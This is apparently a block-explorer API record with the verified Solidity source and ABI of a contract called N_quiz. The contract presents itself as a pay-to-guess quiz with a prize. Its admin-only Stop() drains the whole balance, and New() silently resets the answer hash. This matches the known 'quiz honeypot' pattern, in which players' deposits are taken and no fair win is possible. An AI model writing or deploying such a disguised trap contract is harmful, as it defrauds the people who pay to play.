{"status":"1","message":"OK","result":[{"SourceCode":"contract N_quiz {\r\n    function Try(string _response) external payable {\r\n        require(msg.sender == tx.origin, \"You're not the origin of the Tx\");\r\n\r\n        if (responseHash == keccak256(_response) && msg.value > 0.00001 ether) {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n\r\n    string public question;\r\n\r\n    bytes32 responseHash;\r\n\r\n    mapping(bytes32 => bool) admin;\r\n\r\n    function Start(string _question, string _response) public payable isAdmin {\r\n        if (responseHash == 0x0) {\r\n            responseHash = keccak256(_response);\r\n            question = _question;\r\n        }\r\n    }\r\n\r\n    function Stop() public payable isAdmin {\r\n        msg.sender.transfer(this.balance);\r\n    }\r\n\r\n    function New(string _question, bytes32 _responseHash)\r\n        public\r\n        payable\r\n        isAdmin\r\n    {\r\n        question = _question;\r\n        responseHash = _responseHash;\r\n    }\r\n\r\n    constructor(bytes32[] admins) public {\r\n        for (uint256 i = 0; i < admins.length; i++) {\r\n            admin[admins[i]] = true;\r\n        }\r\n    }\r\n\r\n    modifier isAdmin() {\r\n        require(admin[keccak256(msg.sender)], \"You're not an admin!\");\r\n        _;\r\n    }\r\n\r\n    function() public payable {}\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Try\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"question\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_question\",\"type\":\"string\"},{\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Start\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_question\",\"type\":\"string\"},{\"name\":\"_responseHash\",\"type\":\"bytes32\"}],\"name\":\"New\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"admins\",\"type\":\"bytes32[]\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"N_quiz","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000186a57f3581cf77f4ec8060cee6775ee8238912b5000000000000000000000000","Library":"","LicenseType":"None","SwarmSource":"bzzr://7fed73462791ad9b2583e45ec1b990223de74cf48a22c4ef8d152d24a530406c"}]}